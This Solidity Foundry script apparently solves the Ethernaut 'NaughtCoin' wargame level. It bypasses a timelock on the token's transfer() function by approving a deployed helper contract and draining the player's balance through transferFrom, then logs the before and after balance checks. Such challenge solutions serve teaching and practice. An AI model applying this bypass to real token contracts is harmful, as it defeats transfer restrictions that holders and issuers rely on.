// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Spender {

    function empty_balance(NaughtCoin coin, address wallet) external {
        coin.transferFrom(wallet, address(this), coin.balanceOf(wallet));
    }

}

contract NaughtCoinSolution is Script {

    NaughtCoin public naughtCoinInstance = NaughtCoin(0x87a9Bfb68BF6fD112948f481b9F836c5525032C1);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.logBool(naughtCoinInstance.balanceOf(vm.envAddress("PUBLIC_KEY")) == 0);

        Spender spender = new Spender();
        naughtCoinInstance.approve(address(spender), naughtCoinInstance.balanceOf(vm.envAddress("PUBLIC_KEY")));
        spender.empty_balance(naughtCoinInstance, vm.envAddress("PUBLIC_KEY"));

        console.logBool(naughtCoinInstance.balanceOf(vm.envAddress("PUBLIC_KEY")) == 0);

        vm.stopBroadcast();
    }
}